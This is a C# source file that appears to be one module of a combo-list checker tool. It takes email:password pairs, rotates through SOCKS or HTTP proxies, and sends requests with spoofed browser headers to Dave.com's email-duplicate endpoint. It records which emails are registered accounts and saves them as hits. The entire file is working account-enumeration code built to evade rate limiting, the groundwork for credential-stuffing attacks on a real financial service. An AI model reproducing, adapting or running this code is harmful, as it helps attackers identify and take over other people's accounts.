﻿using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using HttpStatusCode = Leaf.xNet.HttpStatusCode;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class Dave
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.AllowAutoRedirect = true;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                Guid gid1 = Guid.NewGuid();
                string gid = gid1.ToString();
                httpRequest.AddHeader("accept", "application/json, text/plain, */*");
                httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("accept-language", "es-US,es-AR;q=0.9,es-419;q=0.8,es;q=0.7");
                httpRequest.AddHeader("origin", "https://dave.com");
                httpRequest.AddHeader("referer", "https://dave.com/");
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36");
                httpRequest.AddHeader("x-device-id", gid);
                httpRequest.AddHeader("x-device-type", "web");
                var str1 = httpRequest.Get("https://api.dave.com/v2/email_verification/check_duplicate?email=" + strArray1[0]);
                if (str1.StatusCode == HttpStatusCode.OK)
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    ////Program.Save(combo, "Invalids");
                    return true;
                }
                else if (str1.StatusCode == HttpStatusCode.Conflict)
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "Dave VM");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }

            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
